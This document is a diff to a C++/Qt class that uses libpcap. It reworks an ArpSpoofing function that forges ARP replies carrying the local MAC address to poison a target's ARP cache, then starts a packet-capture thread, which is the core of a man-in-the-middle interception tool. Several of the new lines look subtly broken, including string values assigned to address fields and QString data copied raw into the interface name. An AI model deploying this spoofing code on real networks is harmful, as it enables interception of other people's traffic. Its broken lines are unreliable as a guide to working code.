@@ -16,7 +16,7 @@ NetworkController::~NetworkController() {
 
 //private
 
-void NetworkController::RecvPacketThreadFunc(NetworkController* nc) const {
+void NetworkController::RecvPacketThreadFunc() {
     while(1) {
         usleep(10);
 
@@ -25,14 +25,15 @@ void NetworkController::RecvPacketThreadFunc(NetworkController* nc) const {
                 break;
             }
             case STATUS_PAUSE: {
-                unique_lock<mutex> t(nc->mtx_);
-                nc->cv_.wait(t);
+                unique_lock<mutex> t(this->mtx_);
+                this->cv_.wait(t);
                 t.unlock();
                 break;
             }
             case STATUS_PLAY: {
-                unique_lock<mutex> t(nc->mtx_);
-                nc->ReadPacket(nc->cInterfaceInfo_.interfaceName_);
+                unique_lock<mutex> t(this->mtx_);
+                if(this->ReadPacket(this->cInterfaceInfo_.interfaceName_)) {
+                }
                 t.unlock();
                 break;
             }
@@ -46,6 +47,16 @@ void NetworkController::RecvPacketThreadFunc(NetworkController* nc) const {
     }
 END:
     return;
+}
+
+void NetworkController::OpenThread() {
+    // if(hPThread_ != nullptr) {
+    //     WarningMessage("thread is already running. Please terminate it before starting it again.");
+    //     end();
+    //     hPThread_.detach();join();
+    // }
+
+    hPThread_ = std::thread(&NetworkController::RecvPacketThreadFunc, this);
 }
 
 void NetworkController::play() {
@@ -66,6 +77,11 @@ void NetworkController::pause() {
 void NetworkController::end() {
     unique_lock<mutex> t(this->mtx_);
     status_ = STATUS_END;
+}
+
+void NetworkController::WarningMessage(const QString msg) {
+    cout<<"---NetworkController---"<<endl;
+    cout<<"WarningMessage : "<<msg.toStdString()<<endl;
 }
 
 bool NetworkController::OpenPcap(const int timeout) {
@@ -130,8 +146,7 @@ void NetworkController::GetInterfaceInfo() {
     close(sock);
 }
 
-
-Mac NetworkController::GetMac(const QString& interface, const QString targetIP) {
+Mac NetworkController::ResolveMac(const QString targetIP) {
     Mac ret{};
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
 
@@ -141,10 +156,12 @@ Mac NetworkController::GetMac(const QString& interface, const QString targetIP) 
 
         arpreq req{};
 
-        memcpy(req.arp_dev, interface.toStdString().c_str(), sizeof(req.arp_dev));
+        //memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.toStdString().c_str(), sizeof(req.arp_dev));
+        memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.data(), sizeof(req.arp_dev));
 
         req.arp_pa.sa_family = AF_INET;
-        inet_pton(AF_INET, targetIP.toStdString().c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
+        //inet_pton(AF_INET, targetIP.toStdString().c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
+        inet_pton(AF_INET, targetIP.toStdString().data(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
 
         if(ioctl(sock, SIOCGARP, &req) == -1)
             throw runtime_error("Failed to set ioctl");
@@ -180,7 +197,7 @@ bool NetworkController::ReadPacket(const QString& interface) {
     return true;
 }
 
-vector<uint8_t*> NetworkController::GetPacket(const QString interface, const uint16_t etherType, const QString ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
+vector<uint8_t*> NetworkController::GetPacket(const uint16_t etherType, const QString ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
     vector<uint8_t*> packets;
 
     unique_lock<mutex> t(mtx_);
@@ -264,10 +281,10 @@ bool NetworkController::SetCurrentInterface(const QString interface) {
     return false;
 }
 
-bool NetworkController::ArpSpoofing(const QString interface, const QString senderIP,const QString targetIP) {
-    Mac targetMac = GetMac(interface, targetIP);
-
+bool NetworkController::ArpSpoofing(const QString senderIP,const QString targetIP) {
     try {
+        //if(cInterfaceInfo_ == NULL) throw runtime_error("interface is not setup.");
+        Mac targetMac = ResolveMac(targetIP);
         if(targetMac.isNull()) throw runtime_error("target mac is null");
 
         EthArpPacket packet{};
@@ -275,12 +292,9 @@ bool NetworkController::ArpSpoofing(const QString interface, const QString sende
         packet.eth_.dmac_ = targetMac;
         packet.arp_.tmac_ = targetMac;
 
-        for(const auto& info : interfaceInfos_) {
-            if(info.interfaceName_ == interface) {
-                packet.eth_.smac_ = info.mac_;
-                packet.arp_.smac_ = info.mac_;
-            }
-        }
+        packet.eth_.smac_ = cInterfaceInfo_.mac_;
+        packet.arp_.smac_ = cInterfaceInfo_.mac_;
+
 
         packet.eth_.type_ = htons(EthHdr::Arp);
         packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
@@ -288,20 +302,28 @@ bool NetworkController::ArpSpoofing(const QString interface, const QString sende
         packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
         packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
         packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
-        inet_pton(AF_INET, senderIP.toStdString().c_str(), &packet.arp_.sip_);
-        inet_pton(AF_INET, targetIP.toStdString().c_str(), &packet.arp_.dip_);
+
+        //inet_pton(AF_INET, senderIP.toStdString().c_str(), &packet.arp_.sip_);
+        //inet_pton(AF_INET, targetIP.toStdString().c_str(), &packet.arp_.dip_);
+
+        packet.arp_.sip_ = senderIP.toStdString();
+        packet.arp_.tip_ = targetIP.toStdString();
 
         pcap_t* pcap = nullptr;
 
-        for(int i=0; i<interfaceInfos_.size(); i++)
-            if(interfaceInfos_.at(i).interfaceName_ == interface) pcap = pcaps_.at(i);
+        for(int i=0; i<interfaceInfos_.size(); i++) {
+            if(interfaceInfos_.at(i).interfaceName_ == cInterfaceInfo_.interfaceName_) {
+                pcap = pcaps_.at(i);
+                break;
+            }
+        }
 
         if(pcap == nullptr) throw runtime_error("Failed to find pcap opended");
 
         if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket)) == -1)
             throw runtime_error("Failed to send packet : " + string(pcap_geterr(pcap)));
 
-
+        OpenThread();
 
     }catch(const std::exception& e) {
         cerr<<"Failed to ArpSpoofing : "<<e.what()<<endl;
@@ -310,3 +332,6 @@ bool NetworkController::ArpSpoofing(const QString interface, const QString sende
     return true;
 }
 
+void NetworkController::Stop() {
+    pause();
+}
